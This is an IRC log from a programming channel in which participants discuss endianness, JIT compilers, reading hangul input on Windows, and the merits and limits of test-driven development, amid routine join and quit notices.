[05:44:49] *** Quits: mindraj (~crispr@user/mindraj) (Remote host closed the connection)
[05:45:14] *** Joins: mindraj (~crispr@95-27-94-221.broadband.corbina.ru)
[05:45:15] *** Quits: [itchyjunk] (~itchyjunk@user/itchyjunk/x-7353470) (Read error: Connection reset by peer)
[05:45:47] *** Quits: Fleck (~fleck@user/fleck) (Quit: GOSUB w/o RETURN)
[05:46:00] *** Quits: mindraj (~crispr@95-27-94-221.broadband.corbina.ru) (Max SendQ exceeded)
[05:46:40] *** Quits: WilliamLeara (~wdl@cpe-76-185-2-28.tx.res.rr.com) (Ping timeout: 268 seconds)
[05:46:40] *** Joins: mindraj (~crispr@95-27-94-221.broadband.corbina.ru)
[05:46:41] * ski . o O ( "The Dhall Configuration Language" <https://dhall-lang.org/> )
[05:46:52] *** Joins: Fleck (~fleck@user/fleck)
[05:47:06] <ski> d3x0r : sorry, no parse
[05:47:27] *** Quits: mindraj (~crispr@95-27-94-221.broadband.corbina.ru) (Max SendQ exceeded)
[05:47:42] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Ping timeout: 256 seconds)
[05:47:45] <flakland> am i wrong for blaming datapoint/intel ?
[05:47:50] <d3x0r> *shrug*
[05:47:53] *** Joins: mindraj (~crispr@95-27-94-221.broadband.corbina.ru)
[05:48:17] <d3x0r> ski maybe I didn't - what's in your 2-element sets?
[05:48:57] <ski> doesn't matter
[05:49:00] <d3x0r> k
[05:49:20] <d3x0r> nothing then I had a specific pair of metric and axis in mind
[05:49:23] <ski> (this ties into parametricity)
[05:49:27] *** Quits: calcmandan (~quassel@user/calcmandan) (Quit: No Ping reply in 180 seconds.)
[05:50:06] <ski> flakland : for what ?
[05:50:13] <flakland> little endian
[05:50:15] *** Quits: Donitz (~Donitz@88-115-149-152.elisa-laajakaista.fi) (Remote host closed the connection)
[05:50:20] <flakland> what systems came before intel?
[05:50:27] <d3x0r> little endian ftw
[05:50:31] <flakland> wikipedia isn't yeilding much info
[05:50:33] <d3x0r> there's no blame
[05:50:43] * ski . o O ( 6502 is little endian )
[05:50:45] *** Joins: calcmandan (~quassel@user/calcmandan)
[05:50:57] <flakland> what year
[05:51:29] <ski> 1975, apparently
[05:51:43] <flakland> well thats two, so there must have been some technical merrit 
[05:51:59] <d3x0r> ya big number math works better big endian
[05:52:02] <d3x0r> it's how we do it on paper
[05:52:17] <d3x0r> but now numbers are big without regard to being physically big
[05:52:18] <ski> hm ?
[05:52:23] *** Joins: leduyquang753 (~leduyquan@user/leduyquang753)
[05:52:30] *** Joins: Gumshoe (~whoa@cpe-107-184-42-236.socal.res.rr.com)
[05:52:51] <ski> wouldn't you want to start at the least significant end, to handle carries ?
[05:52:59] <d3x0r> sorting big endian works better too
[05:53:00] *** Quits: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[05:53:22] <d3x0r> carries are cheap either way - it's the borrows in division
[05:53:24] <ski> or do you propose to walk over bytes (or words, if you prefer), backwards (iow, towards lower addresses) ?
[05:53:45] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[05:53:45] <d3x0r> well there wsa BCD (using only 0-9 per nibble)
[05:54:06] <ski> point, about lexicographic sorting
[05:54:25] *** Quits: bdeshi (~bdeshi@bdeshi.space) (Quit: bouncer disconnect)
[05:54:41] *** Joins: bdeshi (~bdeshi@bdeshi.space)
[05:55:50] *** Joins: Donitz (~Donitz@88-115-149-152.elisa-laajakaista.fi)
[05:55:51] *** Quits: DPA (~DPA@75-128-16-94.static.cable.fcom.ch) (Quit: ZNC 1.8.2+deb2~bpo10+1 - https://znc.in)
[05:56:08] *** Quits: Inst_ (~Inst@2601:6c4:4080:3f80:1d49:739d:9075:d5df) (Remote host closed the connection)
[05:56:11] *** Quits: Vesryn (~vesryn@user/vesryn) (Quit: Leaving)
[05:56:15] *** Quits: nitrix (~nitrix@user/nitrix) (Quit: Genius is one percent inspiration and ninety-nine percent perspiration)
[05:56:24] *** Joins: Inst_ (~Inst@2601:6c4:4080:3f80:1d49:739d:9075:d5df)
[05:56:30] *** Joins: nitrix_ (~nitrix@user/nitrix)
[05:56:53] *** nitrix_ is now known as nitrix
[05:56:57] *** Joins: Vesryn (~vesryn@user/vesryn)
[05:57:14] *** Joins: DPA (~DPA@75-128-16-94.static.cable.fcom.ch)
[05:57:15] *** Quits: Donitz (~Donitz@88-115-149-152.elisa-laajakaista.fi) (Remote host closed the connection)
[05:58:23] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[05:58:24] <ski> (hm, iirc 6502 did have a BCD mode status flag, affecting arithmetic (`adc' and `sbc' .. maybe `cmp',`cpx',`cpy' as well, not sure)
[05:58:38] *** Quits: ITD4004 (~ITD4004@187.61.233.248) (Remote host closed the connection)
[05:58:58] *** Quits: digdilem (~digdilem@rolf.yuss.org) (Ping timeout: 260 seconds)
[05:58:58] *** Quits: JBFire (~JBFire@pool-71-120-28-40.washdc.east.verizon.net) (Ping timeout: 260 seconds)
[05:59:45] *** Joins: JBFire (~JBFire@pool-71-120-28-40.washdc.east.verizon.net)
[05:59:54] *** Quits: mannu (mannu@wodanaz.se) (Ping timeout: 260 seconds)
[06:00:17] *** Quits: kuku (~kuku@user/kuku) (Read error: Connection reset by peer)
[06:00:22] *** Quits: davros (~davros@host86-185-61-22.range86-185.btcentralplus.com) (Ping timeout: 260 seconds)
[06:00:47] *** Joins: kuku (~kuku@user/kuku)
[06:00:51] <d3x0r> but then ... turns out we use bytes, and lose the bit order on the transform from memory ot the register 
[06:01:10] *** Quits: DPA (~DPA@75-128-16-94.static.cable.fcom.ch) (Client Quit)
[06:01:21] <d3x0r> (or larger groups) and there's type conversion benefits from little endian
[06:01:31] <d3x0r> (metric conversion?)
[06:01:44] *** Joins: mannu (~brutusmcf@wodanaz.se)
[06:02:22] *** Joins: DPA (~DPA@2a05:41c0:b:db04::a3c:10d)
[06:02:52] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[06:02:53] *** Joins: Donitz (~Donitz@88-115-149-152.elisa-laajakaista.fi)
[06:03:10] *** Quits: blinky42 (~quassel@user/blinky42) (Ping timeout: 260 seconds)
[06:03:21] *** Joins: blinky42 (~quassel@jabber.blinkylight.net)
[06:03:21] *** Quits: blinky42 (~quassel@jabber.blinkylight.net) (Changing host)
[06:03:21] *** Joins: blinky42 (~quassel@user/blinky42)
[06:04:15] *** Quits: Donitz (~Donitz@88-115-149-152.elisa-laajakaista.fi) (Remote host closed the connection)
[06:04:31] *** Joins: Hanii (~textual@2a00:23c5:c587:6d00:d558:b250:bcbb:4255)
[06:05:43] *** Quits: Geronimo (~Geronimo@user/geronimo) (Quit: I am away)
[06:06:18] *** Joins: Geronimo (~Geronimo@user/geronimo)
[06:06:30] *** Joins: digdilem (~digdilem@rolf.yuss.org)
[06:06:43] *** Quits: picooz (~picooz@user/picooz) (Quit: Bye ;))
[06:08:01] *** Joins: picooz (~picooz@user/picooz)
[06:08:09] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Remote host closed the connection)
[06:08:47] *** Joins: Quietwalker (~X@cpe-70-113-121-167.austin.res.rr.com)
[06:09:26] *** Quits: yinghua_ (~yinghua@2800:2121:1400:900:c56e:96f4:75cd:50ac) (Quit: Leaving)
[06:09:42] *** Quits: yang (~yang@fsf/member/yang) (Ping timeout: 260 seconds)
[06:09:49] *** Joins: Donitz (~Donitz@88-115-149-152.elisa-laajakaista.fi)
[06:10:26] *** Joins: yang (~yang@212.129.38.130)
[06:10:56] *** Quits: Jaran (~mail@user/jaran) (Remote host closed the connection)
[06:11:39] *** Joins: Jaran (~mail@p2e515106.dip0.t-ipconnect.de)
[06:11:39] *** Quits: Jaran (~mail@p2e515106.dip0.t-ipconnect.de) (Changing host)
[06:11:39] *** Joins: Jaran (~mail@user/jaran)
[06:12:52] *** Quits: genrand (~textual@cpe-74-138-138-71.kya.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[06:13:18] *** yang is now known as Guest6805
[06:13:38] *** Joins: davros (~davros@host86-185-61-22.range86-185.btcentralplus.com)
[06:14:12] *** Joins: CyberTailor (~cyber@gateway/tor-sasl/cybertailor)
[06:16:52] *** Quits: xff0x (~xff0x@2001:1a81:5236:1e00:dda8:eac2:4d01:562e) (Ping timeout: 268 seconds)
[06:18:07] *** Quits: trace987 (~trace@91.66.153.65) (Ping timeout: 268 seconds)
[06:18:40] *** Joins: xff0x (~xff0x@2001:1a81:5273:3700:28cd:42fe:3b9:2637)
[06:18:44] *** Quits: LiftLeft (~LiftLeft@gateway/vpn/pia/liftleft) (Ping timeout: 268 seconds)
[06:19:59] *** Quits: Crescendo (~Crescendo@user/crescendo) (Read error: Connection reset by peer)
[06:21:07] *** Joins: Crescendo (~Crescendo@user/crescendo)
[06:22:35] *** Quits: Guest4193 (~Guest41@eth-west-pareq2-46-193-4-100.wb.wifirst.net) (Quit: Client closed)
[06:25:40] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[06:25:46] *** Joins: pulse_ (~pulse@user/pulse)
[06:26:16] *** Joins: smallville7123 (~smallvill@cpe-172-193-72-46.qld.foxtel.net.au)
[06:26:30] *** Joins: brabrax_ (~brabrax@user/brabrax)
[06:26:36] *** Joins: adder` (~adder@user/adder)
[06:27:18] *** Quits: hexnewbie (~hexnewbie@user/hexnewbie) (Ping timeout: 256 seconds)
[06:27:22] *** Quits: brabrax (~brabrax@user/brabrax) (Ping timeout: 268 seconds)
[06:27:22] *** brabrax_ is now known as brabrax
[06:27:34] *** Joins: genrand (~textual@cpe-74-138-138-71.kya.res.rr.com)
[06:27:46] *** Quits: mindraj (~crispr@95-27-94-221.broadband.corbina.ru) (Quit: Leaving)
[06:28:19] *** Quits: CyberTailor (~cyber@gateway/tor-sasl/cybertailor) (Remote host closed the connection)
[06:28:44] *** Joins: bdeshi- (~bdeshi@bdeshi.space)
[06:29:01] *** Quits: bdeshi (~bdeshi@bdeshi.space) (Ping timeout: 256 seconds)
[06:29:01] *** Quits: pulse (~pulse@user/pulse) (Ping timeout: 256 seconds)
[06:29:01] *** Quits: adder (~adder@user/adder) (Ping timeout: 256 seconds)
[06:29:01] *** bdeshi- is now known as bdeshi
[06:29:12] *** Joins: CyberTailor (~cyber@gateway/tor-sasl/cybertailor)
[06:29:35] *** Quits: Ilyu (~quassel@166.215.82.79.rev.sfr.net) (Ping timeout: 256 seconds)
[06:29:35] *** Quits: AsenMx (~AsenMx@78.90.248.234) (Ping timeout: 256 seconds)
[06:29:59] *** Joins: AsenMx (~AsenMx@78.90.248.234)
[06:30:02] *** Joins: Ilyu (~quassel@166.215.82.79.rev.sfr.net)
[06:30:04] *** pulse_ is now known as pulse
[06:30:09] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[06:30:42] *** Joins: hexnewbie (~hexnewbie@user/hexnewbie)
[06:31:30] *** Joins: password4 (~password@user/password2)
[06:32:26] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[06:34:24] <Linkandzelda> i posted this yesterday but would still like to confirm: with TDD, since it's "test-first", does that mean the first test should be a failing integration test or a failing unit test, or both?
[06:35:59] <sonny> tdd is for unit tests iirc
[06:39:11] <Linkandzelda> sonny: if thats true then i can do integration tests after the fact. either way, i came up with a plan to do them in TDD style too providing I have the full idea of all involved classes, which might turn out to be too annoying
[06:40:30] *** Joins: Hash (~stoned@hack.the.planet.with.hashsecurity.org)
[06:45:56] <apotheon> Linkandzelda: TDD doesn't have to be only unit tests, and whether you start with a failing integration test or a failing unit test depends on the approach you're taking to development.
[06:46:48] <apotheon> Linkandzelda: Some people categorize integration tests (at least in some cases) as "behavior-driven development", but that's more of a subset of TDD than an alternative, as I think of it.
[06:49:04] <Linkandzelda> apotheon: that makes sense. maybe there's such a thing as BTDD or something, hehe
[06:49:06] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[06:49:42] *** Quits: stoned (~stoned@is.coding.when.stoned.io) (Quit: WeeChat 3.3)
[06:51:09] <apotheon> Linkandzelda: Whatever kind of test you're using, it's usually best to write it before the code works, so you can make sure your test will detect failure properly at all.
[06:51:48] <Linkandzelda> apotheon: thats basically what i thought
[06:51:50] *** Joins: Guest41 (~Guest41@eth-west-pareq2-46-193-4-100.wb.wifirst.net)
[06:52:09] <Guest41> how do JIT compilers profile the code before running it?
[06:52:32] <apotheon> Linkandzelda: In fact, I think it's best -- especially for TDD-like workflows -- to first write a test, then write a function that directly returns a wrong answer to make sure the test can fail, then change it to directly return a correct answer (rather than getting the right answer the way it's supposed to) to make sure it can pass, then go ahead and implement things properly.
[06:52:38] <Guest41> or do they just dynamically take notice of hot spots and compile them as the program is running?
[06:53:20] <InPhase> Linkandzelda: TDD is like hiring someone to verify that a new house you're building has the right external length width and height and the right number of subdivisions inside, and then selling the first thing you construct that meets the criteria.
[06:54:28] <InPhase> Linkandzelda: It's extremely easy for tests to inadequately represent the full scope of required properties.
[06:55:20] <Guest41> and what if my program is **really** complicated, and switches from calling method f1() a million times, to f2(), to f3() ... to f1000() over the course of execution, if I were to trigger a compilation for each one of those methods, wouldn't the VM *really* slow down?
[06:55:21] <InPhase> It gets worse at larger complexity scales.
[06:56:26] <InPhase> Guest41: jit does not always work well compared to native compilation.  But it pretty much always works a lot better than interpreted.
[06:56:48] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Remote host closed the connection)
[06:56:53] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[06:57:17] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[06:59:03] <yin846> hi. my question is windows specific but related to programming. im making a simple program that reads a hangul syllable(such as "마" which is "ma" sound) and then prints a romanization. I tried setting the code page to 65001 for UTF-8 but that didn't help. Can someone please take a look at this screenshot. https://ibb.co/Ct47fPP
[06:59:05] <bayaz> Title: error 
[07:00:28] <leduyquang753> std::cin only deals with single-byte characters, you will need different processing.
[07:00:33] <apotheon> "and then selling the first thing you construct that meets the criteria."
[07:00:53] <apotheon> No . . . if you're doing it well, you'll hone and improve until it's good once you're passing the test.
[07:00:53] <Linkandzelda> InPhase: that sounds a bit ridiculous?
[07:00:59] <yin846> ohh. thank you leduyquang753
[07:01:21] <apotheon> You might as well say that any development process is always going to be shit because you can cut corners.
[07:01:22] <Linkandzelda> InPhase: also you are clearly missing the last step of TDD
[07:01:32] <apotheon> The solution is to not cut corners.
[07:01:53] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[07:02:24] <d3x0r> computers are very fininte
[07:02:35] <d3x0r> definite in the class of 'finite precision' :)
[07:02:49] <apotheon> Linkandzelda: Are you referring to the old "red/green/refactor" aphorism?
[07:02:59] <apotheon> . . . or something else?
[07:03:06] <d3x0r> microcomputers and microcontrollers much more so - but they're all unable to be infinite
[07:03:57] <PlanckWalk> Something can be finite at every step, and yet unbounded.
[07:03:59] <Linkandzelda> apotheon: yes, that. because it sounds like what InPhase said was only "red, green"
[07:04:30] <d3x0r> and on TDD - unit tests for integration are incidental along the way as your tests test more coplete portiions of the project they are testing integration  
[07:04:58] *** Quits: Crescendo (~Crescendo@user/crescendo) (Ping timeout: 268 seconds)
[07:05:09] <d3x0r> I'm actually not a fan of heavy inclusion of 'fail is success' tests... they end up trapping you into bug-compatiblile mode instead of being able to handle it alternately
[07:06:03] *** Quits: khyodo (~khyodo@c-73-51-179-14.hsd1.il.comcast.net) (Read error: Connection reset by peer)
[07:06:04] *** Quits: yin846 (~yin@2001:5b0:2a59:26e8:2c2f:90c:241e:3066) (Quit: quit)
[07:06:47] <apotheon> Linkandzelda: Waht InPhase said came off like "red, green, quit your job".
[07:06:52] <apotheon> s/Waht/What/
[07:06:56] <InPhase> :)
[07:07:09] <Linkandzelda> d3x0r: not sure but i thought unit tests werent supposed to test other units?
[07:07:15] <Linkandzelda> apotheon: yes heh
[07:07:17] <dodo> d3x0r: what's a fail is success test? like check that an exception is thrown?
[07:07:21] <InPhase> InPhase was speaking with some contempt of TDD as a substitute for an engineering-focused design approach.
[07:07:27] <d3x0r> dodo ya
[07:07:54] <dodo> that can be useful, but yeah, should certainly only be a small number
[07:07:54] *** Quits: z3t0 (~z3t0@146.71.14.98) (Quit: The Lounge - https://thelounge.chat)
[07:07:54] <InPhase> You do not construct a bridge by first constructing a truck to drive over it to see if it will fall.
[07:08:00] *** Joins: LordRishav (~LordRisha@user/lordrishav)
[07:08:06] <apotheon> InPhase: Don't substitute; just use it as a tool.
[07:08:18] <d3x0r> InPhase I do :) at least from legos
[07:08:26] <InPhase> d3x0r: :)
[07:08:46] <apotheon> The reason you don't do that with a bridge, though, is that it's a lot more expensive to do that with a bridge.
[07:08:50] <d3x0r> that's exactly what TDD is though - but more modular - first you test beams, and beams with welds
[07:08:57] <dodo> but you need a truck to transport the construction material
[07:08:58] *** Quits: AbleBacon (~AbleBacon@user/AbleBacon) (Read error: Connection reset by peer)
[07:09:27] <d3x0r> I think of 'unit' as 'this test is a single unit' rather than 'this is required to test a single unit of code' a single class for example
[07:09:28] <apotheon> . . . and there's d3x0r's point, which is a good point.
[07:09:39] <InPhase> A bridge has complex properties that must be present at the engineering design level, such as robustness against longevity issues and long term weather effects.  One does not "test" these, they are designed in.  Robust complex software has MANY such things engineered into it.
[07:10:11] <apotheon> InPhase: If you don't run a vehicle over a bridge before opening it up to the public, you're doing it wrong.
[07:10:33] <InPhase> Robust software should be resilient even against things that are not supposed to happen, just in case they do because something goes wrong during maintenance or refactoring or discovered mistakes revealed by unexpected complex inputs or hardware scenarios.
[07:10:41] *** Joins: z3t0 (~z3t0@146.71.14.98)
[07:10:51] <apotheon> You say that like it somehow changes anything about TDD.
[07:11:01] <InPhase> You cannot easily test things that are not supposed to happen, because they are not supposed to happen.
[07:11:06] <apotheon> So?
[07:11:12] <dodo> InPhase: mocking
[07:11:19] *** Quits: z3t0 (~z3t0@146.71.14.98) (Client Quit)
[07:11:23] <apotheon> Oh, wait.
[07:11:26] <d3x0r> so you end up coding a way to force it to happen - which invalidates that it won't happen
[07:11:35] <apotheon> You're not even making the reasonable point I thought you were making.
[07:11:35] <Linkandzelda> InPhase: the bridge analogy isn't exactly representational. if you build a bridge in a real life TDD approach then you end up destroying a hell of a lot of trucks, but you end up with a bridge that will be standing after the apocalypse. and getting a failed test isnt "destroying" anything while developing, is it. not like destroying a truck
[07:11:37] *** Joins: z3t0 (~z3t0@146.71.14.98)
[07:11:37] <apotheon> Holy crap.
[07:11:46] <apotheon> 1. You can test things that aren't supposed to happen.
[07:12:00] <InPhase> dodo: Yes, in limited cases mocking can work.  Sometimes what's not supposed to happen is pretty distributed in nature.
[07:12:16] *** Joins: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net)
[07:12:17] <dodo> InPhase: oh yeah, that gets more complex
[07:12:18] <apotheon> 2. Even if you were trying to make the more reasonable point that you can't test things it doesn't occur to you to test, that doesn't mean you can't test the things it *does* occur to you to test.
[07:12:47] <apotheon> (or things that are, for some reason, effectively impossible to test because of infinite possibilities)
[07:12:48] <d3x0r> 'you can't know what you don't know' ?
[07:12:50] <dodo> in my experience you mostly create regression tests for such problems
[07:13:00] <apotheon> right
[07:13:01] <InPhase> Linkandzelda: That's not the core issue though.  The core issue is that driving a truck over a bridge successfully does not mean it's a good bridge.
[07:13:04] <apotheon> a problem occurs
[07:13:12] <apotheon> write a test to ensure it doesn't happen again
[07:13:13] <apotheon> fix it
[07:13:19] <apotheon> be better than before
[07:13:21] <apotheon> QED
[07:13:36] <apotheon> regression tests
[07:13:44] <InPhase> Linkandzelda: It in fact can be an absolutely terrible bridge.
[07:14:04] *** Joins: trace987 (~trace@ip5b429941.dynamic.kabel-deutschland.de)
[07:14:07] <InPhase> Linkandzelda: A bridge that works 99% of the time is even worse than a bridge that works 0% of the time.
[07:15:16] <InPhase> You're not going to kill anybody with a bridge that works 0% of the time.
[07:15:47] <dodo> that doesn't sound right
[07:16:05] *** Quits: akevinhuang2 (~thekevinh@user/thekevinhuang) (Ping timeout: 268 seconds)
[07:16:05] <InPhase> It would never go into use.
[07:16:13] <dodo> it would be used once
[07:16:21] <apotheon> InPhase: If you interpret every idea in the stupidest way possible, you can make anything useful seem dangerous.
[07:16:30] <apotheon> Anyway, I need to get some writing done.  Ta.
[07:17:22] * ski . o O ( "Don't Write Tests!" by John Hughes in 2017-06-20 at <https://www.youtube.com/watch?v=hXnS_Xjwk2Y> )
[07:17:31] *** Joins: gggpkm (~gggpkm@111.63.14.119)
[07:17:36] <InPhase> apotheon: I'm not against testing.  Testing is great.  :)  I'm against test-driven development.  It should not drive the process, it should validate aspects of it only.  The driver needs to be much more intentional engineering.
[07:19:28] <dodo> tdd is a useful concept. like many things it's best when used in moderation
[07:19:35] *** Quits: audiobirb (~audio@user/audio) (Ping timeout: 264 seconds)
[07:19:48] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Remote host closed the connection)
[07:21:21] <Linkandzelda> InPhase: thats pretty obvious though. and honestly, all tests are useless. they only do what you tell them, and you can't possibly tell them everything. TDD doesnt drive the process, it just just reassurance that the function returns what you expect in a test case before moving on to the next piece
[07:22:08] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[07:23:29] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 268 seconds)
[07:24:17] <Linkandzelda> i personally did no automated testing for the last 10 years. any problem that showed up i fixed it on the spot in production. pretty fun.
[07:27:56] *** Quits: trace987 (~trace@ip5b429941.dynamic.kabel-deutschland.de) (Ping timeout: 256 seconds)
[07:29:39] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[07:30:59] <InPhase> Linkandzelda: That's the other extreme, but is also not good.  It's super important to test components so that you can build with them confidently.
[07:31:27] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[07:31:50] <InPhase> Linkandzelda: But for example, value X can come from many locations of the program, and must be within a certain allowed range or the bad thing happens (like a bridge falling).  How do you TDD that?
[07:32:41] <InPhase> Linkandzelda: Conversely, in engineering-driven development, you recognize the urgency of this and add redundant checks for this, and setup processes for handling the situation even if it shouldn't happen.
[07:34:34] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[07:36:26] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Ping timeout: 268 seconds)
[07:39:31] *** Quits: gggpkm (~gggpkm@111.63.14.119) (Ping timeout: 268 seconds)
[07:39:54] <Linkandzelda> InPhase: i guess what I do right now is more engineering focused than test focused. but there's a nice blend of the 2 still possible. TDD might not cover it all but it certainly helps
[07:40:41] <sonny> why are you going to use tdd?
[07:41:00] <Linkandzelda> InPhase: but what you just said, "it should be within a certain allowed range", isnt that part of the spec to be tested against?
[07:41:31] *** Joins: arcatech (~arcatech@user/arcatech)
[07:41:49] <Linkandzelda> sonny: i like that it blends testing with writing code, and the loop it provides. and maybe a better answer is i didnt find another testing system i liked the look of yet
[07:42:10] <sonny> it's not a testing system
[07:42:27] <sonny> if you want to make a test harness, that's another story
[07:43:36] <Linkandzelda> sonny: testing practice, process, though i called it a system since its sort of a system too
[07:43:39] <sonny> tdd was explained to me as a development method where you use tests to construct software, perhaps like asking many questions
[07:44:16] <PlanckWalk> Linkandzelda: You said "TDD doesnt drive the process", but it literally stands for Test *Driven* Design
[07:44:39] <d3x0r> (development not design?)
[07:44:49] <PlanckWalk> Oops yes
[07:44:51] <sonny> so you create as many tests / queries as possible to get a solution
[07:45:31] <PlanckWalk> The fact that it does drive development is literally in its name.
[07:45:59] <sonny> it's sorta like prolog, but really manual
[07:46:06] <PlanckWalk> But sure, you can steal some aspects from TDD and use them in processes that aren't TDD.
[07:46:17] *** Quits: arcatech (~arcatech@user/arcatech) (Ping timeout: 268 seconds)
[07:47:47] <sonny> I think a test harness would be more akin to a series of constraints that must hold for it to be in production or something
[07:47:51] <Linkandzelda> PlanckWalk: well i cant fight against that. i just meant there's a human aspect involved. you still know where you are heading all the time. so who's really driving? i see it more that you just make sure you are not stepping on a rusty nail before actually stepping forward
[07:48:15] <sonny> production could be, in a state acceptable to merge into master or something
[07:48:49] <Linkandzelda> sonny: that sounds like a high level integration test or something?
[07:49:18] <sonny> maybe
[07:49:57] <sonny> you can get these in the form of contracts in some languages, or it may be more involved if it includes external elements
[07:52:53] *** Quits: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net) (Ping timeout: 256 seconds)
[07:53:19] *** Quits: genrand (~textual@cpe-74-138-138-71.kya.res.rr.com) (Quit: Textual IRC Client: www.textualapp.com)
[07:53:35] *** Joins: Inhahe (inhahe@107-213-219-122.lightspeed.miamfl.sbcglobal.net)
[07:54:43] <sonny> in my brief experience, adding tdd to a legacy code base just created more work and unnecessary code since developers saw the tests as a hindrance, tdd was added before me and there was plenty of code with simple tests that always passed
[07:56:09] *** Quits: zaher__ (~zaher@46.58.212.57) (Ping timeout: 268 seconds)
[07:58:50] *** Quits: Khoyo (~khoyo@user/khoyo) (Ping timeout: 260 seconds)
[07:59:19] <Linkandzelda> sonny: to existing code i can imagine it being a pain, since it wasnt created with TDD in mind. but for brand new code?
[07:59:51] <sonny> sure, but keeping up tdd will require effort
[08:00:40] <Linkandzelda> yea, i agree with that. im not sure how long i'll keep up with it if it becomes a hinderence. i need to be sold that whatever time im putting into testing is well spent
[08:01:20] <sonny> the upside is, if followed well you can get good insight into the development process of your peers which would be documented by these tests
[08:02:01] <sonny> so it's easier to "quantify" your development time I guess
[08:02:28] <sonny> slight downsides are slower build times and much more code
[08:02:54] *** Joins: Khoyo (~khoyo@user/khoyo)
[08:03:23] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[08:05:26] *** Quits: rtypo (~alex@user/rtypo) (Ping timeout: 260 seconds)
[08:07:52] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[08:10:02] *** Quits: DarkTrick_ (~DarkTrick@pl-749-047.bunbun.ne.jp) (Ping timeout: 260 seconds)
[08:13:47] <Linkandzelda> sonny: i think its also important where the code is gonna run, and how easy it can be accessed. web for example, you get access to the environment. but distributed code, you dont. that's why im looking into testing now, so i have peace of mind over the distributed code to a better extent
[08:14:20] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Quit: Ping timeout (120 seconds))
[08:14:33] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[08:14:57] *** Joins: lane (~lane@86.106.121.217)
[08:15:03] <sonny> Linkandzelda tdd is not going to help with distributed code
[08:15:26] <sonny> there are other tools / techniques for that
[08:15:55] <Linkandzelda> sonny: what kind of tools would help better?
[08:16:17] <sonny> unless, you have a unit test system that can work with distributed stuff
[08:16:49] <Linkandzelda> sonny: exactly what does that mean? im not sure
[08:18:16] <sonny> well for starters, you are testing code across machines now
[08:18:47] <sonny> maybe you have some guarantees all the machines will be the same?
[08:19:49] <sonny> I didn't explain that well
[08:20:51] <sonny> maybe you can do it with tdd, but for some reason I think asking questions in a system with many machines becomes more complicated
[08:21:08] <sonny> so much more to consider
[08:22:38] <sonny> my experience with distributed systems was pushing rpms out and hoping it works lol
[08:23:14] <sonny> if a device failed we just sent out a technician
[08:23:43] <Linkandzelda> sonny: one example I recall is when I migrated some old code from an old mysql version to the latest one. the database itself didnt have defaults set, and the queries relied on the server not giving errors when missing fields that didnt have defaults. and the entire code fell apart and every single query needed refactoring along with the database
[08:24:34] <sonny> oof
[08:24:46] <sonny> that's painful
[08:25:42] <Linkandzelda> sonny: of course the quick fix was turning off strict mode on the server and it went back to how it was working before. but it highlighted the issue
[08:25:50] *** Inst_ is now known as Inst
[08:26:07] <sonny> the thing I was working on, would be a really good place for a resilient system that needs little attention, but it wasn't that good lol
[08:27:14] <sonny> I think some package managers can handle that situation now, like guix or nix
[08:27:20] <Linkandzelda> im more concerned about writing applications, like for example an IRC client, and then sending that out to be run in the wild by a completely unknown amount of system configurations. thats what i meant by distributed software since its distributed out in the wild. unit tests and good QA is all i can think of to make it work well
[08:27:23] <InPhase> Linkandzelda: And what did the code exhibit as its behavior when those failures happened?
[08:28:10] <Linkandzelda> InPhase: it was absolutely terrible. inserts failed. so nothing was added when it was expected to be added. selects and updates worked though if i recall
[08:28:14] *** Quits: password4 (~password@user/password2) (Ping timeout: 268 seconds)
[08:28:19] *** Quits: soapsudsxx (~soapsudsx@209.221.40.144) (Remote host closed the connection)
[08:28:59] <InPhase> Linkandzelda: SQL does tend to be especially bad about that.  SQL is a terrible interface for dealing with data that is supposed to be important.
[08:29:20] <sonny> how will unit tests work if the machines are different?
[08:30:02] *** Quits: riff-IRC (~riff-IRC@user/riff-irc) (Remote host closed the connection)
[08:30:32] <InPhase> Linkandzelda: A good system will detect errors on the fly, and report them diagnostically, so that when something goes on in the wild that is outside of what can be made to work, it is at least well-defined and provides diagnostic information for a bug report.
[08:30:37] <sonny> guix, nix can get you an environment that you can deploy code to without this trouble I think
[08:31:15] *** Joins: riff-IRC (~riff-IRC@user/riff-irc)
